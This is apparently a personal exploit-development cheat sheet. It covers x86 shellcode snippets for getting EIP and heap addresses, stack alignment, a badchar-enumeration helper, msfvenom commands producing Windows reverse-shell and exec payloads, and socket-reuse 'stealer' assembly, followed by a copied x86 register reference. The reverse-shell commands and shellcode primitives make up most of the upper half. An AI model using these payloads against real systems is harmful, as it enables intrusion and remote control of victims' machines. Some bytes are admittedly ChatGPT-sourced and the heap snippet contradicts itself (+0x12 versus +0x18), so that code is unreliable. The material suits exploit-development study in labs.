hub
#shellcode #msfvenom #kali

## Get Stack
If ChatGPT didn't lie
```x86
E8 FB FF FF FF     ; call next
58                 ; next: pop eax
83 C0 FA           ; add eax, -6 (3 bytes)
```

```python
get_eip_in_eax  = b""
get_eip_in_eax += b"\xE8\xFB\xFF\xFF\xFF"
get_eip_in_eax += b"\x58"
get_eip_in_eax += b"\x83\xC0\xFA"
```
## Get Heap

```x86
31 d2                   ; xor    edx,edx
80 c2 30                ; add    dl,0x30
64 8b 12                ; mov    edx,DWORD PTR fs:[edx]
8b 52 12                ; mov    edx,DWORD PTR [edx+0x12] 
```

```python
get_heap_in_edx  = b""
get_heap_in_edx += b"\x31\xd2"        # xor    edx,edx
get_heap_in_edx += b"\x80\xc2\x30"    # add    dl,0x30
get_heap_in_edx += b"\x64\x8b\x12"    # mov    edx,DWORD PTR fs:[edx]
get_heap_in_edx += b"\x8b\x52\x18"    # mov    edx,DWORD PTR [edx+0x18] 

get_heap_in_ebx  = b""
get_heap_in_ebx += b"\x31\xdb"        # xor    ebx,ebx
get_heap_in_ebx += b"\x80\xc3\x30"    # add    bl,0x30
get_heap_in_ebx += b"\x64\x8b\x1b"    # mov    ebx,DWORD PTR fs:[ebx]
get_heap_in_ebx += b"\x8b\x5b\x18"    # mov    ebx,DWORD PTR [ebx+0x18] 
```
## Packing

```python
def p32(x):
    return struct.pack('<I', x)

def u32(x):
    return struct.unpack('<I', x)
```
## Align stack

```asm
push esp; 
pop eax; 
add ax, [value]; 
jmp eax;
```
or quick fix:
``` python
ALIGN_STACK = b'\x83\xE4\xF0'   # and    esp,0xfffffff0
```
## Badchars
```python
BADCHARS = [0x00, 0x09, 0x0a, 0x0c, 0x0d, 0x20, 0x25, 0x26, 0x2B, 0x3D, 0xbe]

def print_badchars(badchars):
    print(
        "Current Badchars: " + "".join(
            [
                "\\x" + x.rjust(2, "0") for x in ",".join(
                [hex(x) for x in badchars]
                ).replace("0x", "").split(",")
            ]
        )
    )
    
def get_badchars(ord_start, ord_end, badchars, return_bytes=True):
    print_badchars(badchars)

    if ord_end > 0xff:
        print("Checking final characters")
        ord_end = 0xff

    print("Checking characters in range: ", ord_start, ",", ord_end)

    characters = [o for o in range(ord_start, ord_end + 1) if o not in badchars]
    print([hex(x) for x in characters])

    if return_bytes:
        characters = bytes(characters)
    else:
        characters = "".join([chr(o) for o in characters])

    return characters

```
## MSFVenom
#### Reverse Shell
351 bytes:
```bash
msfvenom -p windows/shell_reverse_tcp exitfunc=thread -a x86 -f python -b'\x00' -e x86/shikata_ga_nai -v payload LHOST=192.168.49.51 LPORT=4444
```

Common badchar version:
```bash
msfvenom -p windows/shell_reverse_tcp exitfunc=thread -a x86 -f python -b'\x00\x0a\x0d\xff' -e x86/shikata_ga_nai -v payload LHOST=192.168.1.5 LPORT=4444
```

Alphanumeric with known address:
702 bytes
```bash
msfvenom -p windows/shell_reverse_tcp exitfunc=thread -a x86 -f python -b'\x00' -e x86/alpha_mixed BufferRegister=EAX -v payload LHOST=192.168.230.10 LPORT=4444
```
#### Pop Charmap
223 bytes
```bash
msfvenom -p windows/exec -a x86 -b "\x00" --encoder x86/shikata_ga_nai CMD="charmap.exe" EXITFUNC=thread -f python -v payload
```
msf-nasm_shell
#### Socket Stealer
```x86
push esp      ;
pop eax       ;
add ax, 0x188 ; Get pointer to socket descriptor, (!!const a, exploit specific)

sub esp, 0x64 ; Make space for args on stack (x86), (!!const b, not exploit specific)

xor ebx,ebx ;
push ebx    ; Push 0 onto the stack for the flag argument

add bh, 0x4 ;
push ebx    ; Push 0x400 to stack for buffer length argument (0x00 in bl so => 1024)

push esp        ;
pop ebx         ;
add ebx, 0x64   ; (const B, not exploit specific)
push ebx        ; Push pointer to output buffer location

push dword ptr ds:[eax] ; Pushes the value of the socket descriptor to stack

mov eax, 0x40252c90 ; recv shifted to left and NOP added, (!!const c, recv addr,  
                    ; exploit specific)

shr eax, 8          ; shift it right, removing NOP and adding 00
call eax            ; calls the function
```
#### Small Shellcode (Stager)
https://sekuro.io/blog/writing-small-reverse-shellcode/
# Registers
*Copied here for the sake of reminding which registers are the best to look at for certain gadgets (using registers for what they are designed for is more likely to result in useful gadgets being present)*

https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html

The main tools to write programs in x86 assembly are the processor registers. The registers are like variables built in the processor. Using registers instead of memory to store values makes the process faster and cleaner. The problem with the x86 series of processors is that there are few registers to use. This section describes the main use of each register and ways to use them. That in note that the rules described here are more suggestions than strict rules. Some operations need absolutely some kind of registers but most of the you can use any of the freely.

Here is a list of the available registers on the 386 and higher processors. This list shows the 32 bit registers. Most of the can be broken down to 16 or even 8 bits register.
## General registers
As the title says, general register are the one we use most of the time Most of the instructions perform on these registers. They all can be broken down into 16 and 8 bit registers.

32 bits :  EAX EBX ECX EDX
16 bits : AX BX CX DX
 8 bits : AH AL BH BL CH CL DH DL

The "H" and "L" suffix on the 8 bit registers stand for high byte and low byte. With this out of the way, let's see their individual main use

- EAX,AX,AH,AL : 
	- Called the **Accumulator register**
	- It is used for *I/O port access, arithmetic, interrupt calls, etc...*

- EBX,BX,BH,BL : 
	- Called the **Base register**
	- It is used as a *base pointer for memory access*
	- Gets some *interrupt return values*

- ECX,CX,CH,CL : 
	- Called the **Counter register**
	- It is used as a *loop counter and for shifts*
	- Gets some *interrupt values*

- EDX,DX,DH,DL : 
	- Called the **Data register**
	- It is used for *I/O port access, arithmetic, some interrupt calls*
## Segment registers
Segment registers hold the segment address of various items. They are only available in 16 values. They can only be set by a general register or special instructions. Some of them are critical for the good execution of the program and you might want to consider playing with them when you'll be ready for multi-segment programming.

- CS: 
	- Holds the **Code segment** in which your program runs
	- Changing its value might make the computer hang

- DSS
	- Holds the **Data segment** that your program accesses
	- Changing its value might give erroneous data

- ES, FS, GS:
	- These are *extra segment registers* available for *far pointer addressing* like video memory and such

- SS: 
	- Holds the *Stack segment* your program uses
	- *Sometimes has the same value as DS*
	- Changing its value can give unpredictable results, mostly data related
## Indexes and pointers
Indexes and pointer and the offset part of and address. They have various uses but each register has a specific function. They some time used with a segment register to point to far address (in a 1Mb range). The register with an "E" prefix can only be used in protected mode.

- ES: EDI, EDI, DI : 
	- **Destination index register**
	- Used for string, memory array copying and setting and for far pointer addressing with ES

- DS: ESI, EDI, SI : 
	- **Source index register**
	- Used for *string and memory array copying*

- SS: EBP, EBP, BP : 
	- **Stack Base pointer register**
	- Holds the *base address of the stack*

- SS: ESP, ESP, SP : 
	- **Stack pointer register**
	- Holds the *top address of the stack*

- CS: EIP, EIP, IP : 
	- *Index Pointer*
	- Holds the *offset of the next instruction*
	- It *can only be read*
## The EFLAGS register
The **EFLAGS** register *hold the state of the processor*. It is modified by many instructions and is used for *comparing some parameters*, *conditional loops* and *conditional jumps*. Each bit holds the state of specific parameter of the last instruction.

| Bit  | Label   | Desciption |
| ---- | ------- | -------------- |
|0    |  CF   |   Carry flag |
|2   |   PF    |  Parity flag |
|4    |  AF   |   Auxiliary carry flag |
|6    |  ZF  |    Zero flag |
|7  |    SF  |    Sign flag |
|8    | TF   |   Trap flag | 
|9      | IF    |  Interrupt enable flag |
|10    | DF |     Direction flag |
|11 |    OF  |    Overflow flag |
|12-13 | IOPL |   I/O Priviledge level |
|14   |  NT   |  Nested task flag |
|16   |  RF   |   Resume flag |
|17   |  VM |     Virtual 8086 mode flag |
|18 |    AC  |    Alignment check flag (486+) |
|19    | VIF  |   Virutal interrupt flag |
|20  |   VIP |    Virtual interrupt pending flag |
|21   |  ID  |    ID flag |

Those that are not listed are reserved by Intel.
## Undocumented registers
There are registers on the 80386 and higher processors that are not well documented by Intel. These are divided in control registers, debug registers, test registers and protected mode segmentation registers. 

As far as I know, the control registers, along with the segmentation registers, are used in protected mode programming, all of these registers are available on 80386 and higher processors except the test registers that have been removed on the Pentium. 

- **Control registers** are *CR0* to *CR4*, 
- **Debug registers** are *DR0* to *DR7*, 
- **Test registers** are *TR3* to *TR7* 
- **Protected Mode Segmentation** registers are *GDTR* (Global Descriptor Table Register), *IDTR* (Interrupt Descriptor Table Register), *LDTR* (Local DTR), and *TR*. 